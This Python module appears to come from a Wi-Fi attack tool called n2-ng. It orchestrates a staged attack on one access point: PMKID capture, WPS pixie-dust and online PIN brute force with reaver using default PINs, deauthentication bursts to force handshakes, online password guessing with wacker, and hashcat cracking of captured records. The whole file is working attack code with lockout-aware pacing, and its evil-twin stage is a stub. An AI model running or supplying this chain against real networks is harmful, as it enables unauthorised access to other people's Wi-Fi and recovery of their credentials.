"""OMNI Attack — adaptive all-stage attack chain (n2-ng v1.7.0).

Self-contained orchestrator; all application dependencies (PMKID attacker,
hashcat command builder, deauth controller, capture manager) are injected by
the caller so this module has no imports from n2ng.main (no import cycle).
"""

from __future__ import annotations

import os
import re
import shutil
import signal
import subprocess
import threading
import time
from pathlib import Path

# Small set of well-known factory-default WPS PINs (budgeted online stage).
DEFAULT_WPS_PINS = [
    "12345670", "00000000", "12345678", "11111111", "22222222",
    "88888888", "99999999", "56562562", "20172527", "43214123",
]

WPS_SUCCESS_RE = re.compile(r"(?:WPA PSK|WPS PIN)\s*:\s*'?([^\s']+)")
WPS_LOCKOUT_RE = re.compile(r"rate limiting|lockout|locked", re.IGNORECASE)
HASHCAT_RECOVERED_RE = re.compile(r"Recovered\.+:\s*(\d+)/(\d+)")


def wps_state(bssid: str, wps_lines: list[str] | None) -> str:
    """Classify WPS state for a BSSID from wash-style output lines.

    Returns "locked", "enabled", "off" (seen without WPS), or "unknown".
    wash row columns: BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID
    """
    for line in wps_lines or []:
        tokens = line.split()
        if not tokens:
            continue
        for idx, tok in enumerate(tokens):
            if tok.upper() == bssid.upper():
                if len(tokens) <= idx + 4:
                    return "unknown"
                if tokens[idx + 3] in ("1.0", "2.0"):
                    return "locked" if tokens[idx + 4] == "Yes" else "enabled"
                return "unknown"
    return "unknown"


def _default_run_cmd(
    stop_event: threading.Event, cmd: list[str], timeout: int | None, log_func=None
) -> tuple[int, str]:
    """Run cmd in its own process group; kill on stop event or timeout."""
    if os.geteuid() != 0:
        # Wording deliberately avoids "locked"/"lockout" substrings — WPS_LOCKOUT_RE
        # scans this same string via the (rc, out) return value, and a message
        # containing e.g. "blocked" would be misread as an AP rate-limit lockout.
        msg = f"n2-ng: refusing to run '{cmd[0]}' — not root (relaunch with: sudo n2-ng)"
        if log_func:
            log_func(msg)
        return 1, msg
    proc = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        encoding="utf-8", errors="replace", start_new_session=True,
    )
    deadline = time.monotonic() + timeout if timeout else None
    output: list[str] = []
    try:
        while proc.poll() is None:
            if stop_event.is_set() or (deadline and time.monotonic() > deadline):
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    proc.wait(timeout=3)
                except Exception:
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    except Exception:
                        pass
                break
            time.sleep(0.2)
        if proc.stdout:
            output = proc.stdout.read().splitlines()
        return proc.poll() if proc.poll() is not None else 1, "\n".join(output)
    finally:
        if proc.poll() is None:
            try:
                proc.kill()
                proc.wait(timeout=2)
            except Exception:
                pass


class EvilTwinStage:
    """WPA3 transition-mode downgrade evil twin. Planned for v1.8."""

    def run(self):
        raise NotImplementedError("EvilTwinStage lands in v1.8 (hostapd-mana based downgrade twin)")


class OmniAttackOrchestrator(threading.Thread):
    """Adaptive all-stage attack chain for one locked target.

    PROFILE → PMKID → WPS → HANDSHAKE → EVILTWIN (stub) → ONLINE → CRACK.
    First success short-circuits to the report. Stop Attack kills the
    orchestrator and every stage worker.
    """

    STAGES = ("PROFILE", "PMKID", "WPS", "HANDSHAKE", "EVILTWIN", "ONLINE", "CRACK", "DONE")

    def __init__(
        self,
        net: dict,
        profile: dict,
        mon_iface: str,
        sta_mac: str,
        attack,
        capture_manager,
        log_func,
        event_queue=None,
        pmkid_factory=None,
        target_dir: Path | None = None,
        build_crack_cmd=None,
        run_cmd=None,
        wps_lines: list[str] | None = None,
        wordlist: Path | None = None,
        crack_rules: Path | None = None,
        clients: list[str] | None = None,
        pmkid_window: int = 30,
        max_lockouts: int = 3,
        max_deauth_rounds: int = 6,
        deauth_interval: int = 15,
        max_online_pins: int = 20,
        max_online_passwords: int = 5,
        crack_timeout: int = 600,
    ):
        super().__init__(daemon=True)
        self.net = net
        self.profile = profile
        self.mon_iface = mon_iface
        self.sta_mac = sta_mac
        self.attack = attack
        self.capture_manager = capture_manager
        self.log = log_func
        self.queue = event_queue
        self.pmkid_factory = pmkid_factory
        self.target_dir = target_dir
        self.build_crack_cmd = build_crack_cmd
        self._run_cmd = run_cmd or (lambda cmd, timeout: _default_run_cmd(self._stop, cmd, timeout, self.log))
        self._is_root = os.geteuid() == 0
        self.wps_lines = list(wps_lines or [])
        self.wordlist = wordlist
        self.crack_rules = crack_rules
        self.clients = clients or []
        self.pmkid_window = pmkid_window
        self.max_lockouts = max_lockouts
        self.max_deauth_rounds = max_deauth_rounds
        self.deauth_interval = deauth_interval
        self.max_online_pins = max_online_pins
        self.max_online_passwords = max_online_passwords
        self.crack_timeout = crack_timeout
        self._stop = threading.Event()
        self.pmkid_attacker = None
        self.stage_results: list[dict] = []
        self.succeeded_stage: str | None = None
        self.recovered_secret: str | None = None
        self.crack_file: Path | None = None

    # --------------------------------------------------------------
    def stop(self):
        self._stop.set()
        if self.pmkid_attacker:
            self.pmkid_attacker.stop()

    def _emit_stage(self, stage: str):
        if self.queue is not None:
            self.queue.put(("omni_stage", stage))

    def _record(self, stage: str, result: str, seconds: float, note: str = ""):
        self.stage_results.append({"stage": stage, "result": result, "seconds": round(seconds, 1), "note": note})
        self.log(f"OMNI [{stage}] {result} ({seconds:.1f}s){(' — ' + note) if note else ''}")

    def _stopped(self) -> bool:
        return self._stop.is_set()

    # --------------------------------------------------------------
    def run(self):
        bssid = self.net["bssid"]
        self._emit_stage("PROFILE")
        t0 = time.monotonic()
        pmf = self.profile.get("pmf", "unknown")
        kind = "WPA3-transition" if self.profile.get("transition") else ("WPA3" if self.profile.get("wpa3") else self.profile.get("privacy", "?"))
        wps = wps_state(bssid, self.wps_lines)
        self._record("PROFILE", "OK", time.monotonic() - t0, f"{kind}, PMF {pmf}, WPS {wps}, {len(self.clients)} client(s)")

        handlers = [
            ("PMKID", self._stage_pmkid),
            ("WPS", lambda: self._stage_wps(wps)),
            ("HANDSHAKE", self._stage_handshake),
            ("EVILTWIN", self._stage_eviltwin),
            ("ONLINE", lambda: self._stage_online(wps)),
        ]
        cracked = False
        for name, handler in handlers:
            if self._stopped():
                self._record(name, "ABORT", 0.0, "stopped by user")
                break
            if name == "WPS" and wps != "enabled":
                self._record("WPS", "SKIP", 0.0, f"WPS {wps}")
                continue
            if name == "HANDSHAKE" and pmf == "required":
                self._record("HANDSHAKE", "SKIP", 0.0, "PMF required — 802.11w blocks deauth")
                continue
            if name == "ONLINE" and self._radio_material_captured():
                # Online guessing only when capture stages failed.
                self._record("ONLINE", "SKIP", 0.0, "capture material already available")
                continue
            self._emit_stage(name)
            if handler():
                self.succeeded_stage = name
                break

        if not self._stopped() and self.succeeded_stage != "WPS" and not self.recovered_secret:
            self._emit_stage("CRACK")
            cracked = self._stage_crack()
            if cracked:
                self.succeeded_stage = self.succeeded_stage or "CRACK"
        self._emit_stage("DONE")
        self._report()

    # --------------------------------------------------------------
    def _stage_pmkid(self) -> bool:
        if self.pmkid_factory is None:
            self._record("PMKID", "SKIP", 0.0, "no PMKID attacker available")
            return False
        t0 = time.monotonic()
        self.pmkid_attacker = self.pmkid_factory()
        self.pmkid_attacker.start()
        deadline = time.monotonic() + self.pmkid_window
        while self.pmkid_attacker.is_alive() and time.monotonic() < deadline and not self._stopped():
            time.sleep(0.2)
        if self.pmkid_attacker.is_alive():
            self.pmkid_attacker.stop()
        ok = bool(getattr(self.pmkid_attacker, "result_path", None))
        self._record("PMKID", "OK" if ok else "FAIL", time.monotonic() - t0,
                     "PMKID captured" if ok else "AP did not return a PMKID")
        return ok

    def _stage_wps(self, wps: str) -> bool:
        if not self._is_root:
            self._record("WPS", "FAIL", 0.0, "not root — reaver needs raw-socket access (relaunch with: sudo n2-ng)")
            return False
        bssid = self.net["bssid"]
        channel = str(self.net.get("channel", ""))
        lockouts = 0
        t0 = time.monotonic()
        # Pixie-dust first: offline, fast, single exchange.
        rc, out = self._run_cmd(["reaver", "-i", self.mon_iface, "-b", bssid, "-c", channel, "-K", "1", "-vv"], timeout=180)
        secret = self._wps_secret(out)
        if secret:
            self.recovered_secret = secret
            self._record("WPS", "OK", time.monotonic() - t0, "pixie-dust recovered credentials")
            return True
        if WPS_LOCKOUT_RE.search(out):
            lockouts += 1
        # Paced online PIN with lockout-aware abort.
        while lockouts < self.max_lockouts and not self._stopped():
            rc, out = self._run_cmd(["reaver", "-i", self.mon_iface, "-b", bssid, "-c", channel, "-vv"], timeout=240)
            secret = self._wps_secret(out)
            if secret:
                self.recovered_secret = secret
                self._record("WPS", "OK", time.monotonic() - t0, "reaver recovered credentials")
                return True
            if WPS_LOCKOUT_RE.search(out):
                lockouts += 1
                self.log(f"OMNI [WPS] AP rate limiting detected ({lockouts}/{self.max_lockouts}) — pacing")
                if not self._sleep(15):
                    break
            else:
                break  # reaver exited without lockout: PIN space exhausted or failed
        self._record("WPS", "FAIL", time.monotonic() - t0,
                     f"lockouts={lockouts}" if lockouts >= self.max_lockouts else "no credentials recovered")
        return False

    @staticmethod
    def _wps_secret(output: str) -> str | None:
        match = WPS_SUCCESS_RE.search(output or "")
        return match.group(1) if match else None

    def _stage_handshake(self) -> bool:
        t0 = time.monotonic()
        bssid = self.net["bssid"]
        for _round in range(self.max_deauth_rounds):
            if self._stopped():
                break
            if self.capture_manager.handshake_found or self.capture_manager.pmkid_found:
                self._record("HANDSHAKE", "OK", time.monotonic() - t0, "capture gate satisfied")
                return True
            # count=1: aireplay-ng sends 64 deauth frames per count unit, so a
            # single count is already a full kick burst. Larger counts flood
            # the airtime and clients back off without re-handshaking.
            self.attack.deauth_all(bssid, self.mon_iface, count=1, clients=self.clients)
            if not self._sleep(self.deauth_interval):
                break
        ok = bool(self.capture_manager.handshake_found or self.capture_manager.pmkid_found)
        self._record("HANDSHAKE", "OK" if ok else "FAIL", time.monotonic() - t0,
                     "capture gate satisfied" if ok else f"no handshake after {self.max_deauth_rounds} rounds")
        return ok

    def _stage_eviltwin(self) -> bool:
        t0 = time.monotonic()
        try:
            EvilTwinStage().run()
        except NotImplementedError as exc:
            self._record("EVILTWIN", "STUB", time.monotonic() - t0, str(exc))
        return False

    def _stage_online(self, wps: str) -> bool:
        t0 = time.monotonic()
        if not self._is_root:
            self._record("ONLINE", "FAIL", 0.0, "not root — reaver/wacker need raw-socket access (relaunch with: sudo n2-ng)")
            return False
        bssid = self.net["bssid"]
        channel = str(self.net.get("channel", ""))
        if wps == "enabled":
            tried = 0
            for pin in DEFAULT_WPS_PINS[: self.max_online_pins]:
                if self._stopped() or tried >= self.max_online_pins:
                    break
                tried += 1
                rc, out = self._run_cmd(
                    ["reaver", "-i", self.mon_iface, "-b", bssid, "-c", channel, "-p", pin, "-vv"],
                    timeout=90,
                )
                secret = self._wps_secret(out)
                if secret:
                    self.recovered_secret = secret
                    self._record("ONLINE", "OK", time.monotonic() - t0, f"default PIN worked ({tried} tried)")
                    return True
                if WPS_LOCKOUT_RE.search(out):
                    self._record("ONLINE", "FAIL", time.monotonic() - t0, f"AP locked after {tried} PIN(s)")
                    return False
            self._record("ONLINE", "FAIL", time.monotonic() - t0, f"PIN budget exhausted ({tried}/{self.max_online_pins})")
            return False
        # Password online guessing: strictly budgeted, single pass, only via wacker.
        wacker = shutil.which("wacker")
        if wacker and self.wordlist and Path(self.wordlist).exists() and self.max_online_passwords > 0:
            try:
                words = Path(self.wordlist).read_text(errors="ignore").splitlines()[: self.max_online_passwords]
            except OSError:
                words = []
            if words:
                budget_file = Path(self.target_dir or ".") / "omni_online_budget.txt"
                try:
                    budget_file.write_text("\n".join(words) + "\n")
                except OSError:
                    pass
                rc, out = self._run_cmd(
                    [wacker, "--interface", self.mon_iface, "--bssid", bssid,
                     "--ssid", self.net.get("essid", ""), "--wordlist", str(budget_file)],
                    timeout=300,
                )
                if "PSK" in out and "found" in out.lower():
                    self._record("ONLINE", "OK", time.monotonic() - t0, "online password guessed")
                    return True
        self._record("ONLINE", "SKIP", time.monotonic() - t0, "no usable online vector (WPS off / wacker absent)")
        return False

    def _radio_material_captured(self) -> bool:
        return bool(
            (self.pmkid_attacker and getattr(self.pmkid_attacker, "result_path", None))
            or self.capture_manager.handshake_found
            or self.capture_manager.pmkid_found
        )

    # --------------------------------------------------------------
    def collect_22000_records(self) -> list[str]:
        """Batch every .22000 record under the target directory, deduped."""
        records: list[str] = []
        seen = set()
        if not self.target_dir or not Path(self.target_dir).is_dir():
            return records
        for path in sorted(Path(self.target_dir).glob("*.22000")):
            try:
                lines = path.read_text(errors="ignore").splitlines()
            except OSError:
                continue
            for line in lines:
                line = line.strip()
                if line.startswith("WPA*") and line not in seen:
                    seen.add(line)
                    records.append(line)
        return records

    def _stage_crack(self) -> bool:
        t0 = time.monotonic()
        records = self.collect_22000_records()
        if not records:
            self._record("CRACK", "SKIP", time.monotonic() - t0, "no .22000 material for this target")
            return False
        batch = Path(self.target_dir) / f"omni_batch_{time.strftime('%Y-%m-%d_%H-%M-%S')}.22000"
        try:
            batch.write_text("\n".join(records) + "\n")
        except OSError as exc:
            self._record("CRACK", "FAIL", time.monotonic() - t0, f"batch write failed: {exc}")
            return False
        self.crack_file = batch
        if self.build_crack_cmd is None:
            self._record("CRACK", "SKIP", time.monotonic() - t0, f"batch ready at {batch} (no hashcat wiring)")
            return False
        cmd = self.build_crack_cmd(batch)
        rc, out = self._run_cmd(cmd, timeout=self.crack_timeout)
        match = HASHCAT_RECOVERED_RE.search(out or "")
        cracked = bool(match and int(match.group(1)) > 0)
        self._record("CRACK", "OK" if cracked else "FAIL", time.monotonic() - t0,
                     f"{match.group(0) if match else 'no recovered line'} (rc={rc})")
        return cracked

    # --------------------------------------------------------------
    def _sleep(self, seconds: float) -> bool:
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            if self._stopped():
                return False
            time.sleep(0.2)
        return True

    def summary(self) -> str:
        lines = ["OMNI Attack report:"]
        for row in self.stage_results:
            lines.append(f"  {row['stage']:<10} {row['result']:<5} {row['seconds']:>7.1f}s  {row['note']}")
        verdict = self.succeeded_stage or "NONE"
        lines.append(f"  Result: {'succeeded at ' + verdict if self.succeeded_stage else 'all stages exhausted'}")
        if self.recovered_secret:
            lines.append(f"  Recovered: {self.recovered_secret}")
        return "\n".join(lines)

    def _report(self):
        for line in self.summary().splitlines():
            self.log(line)
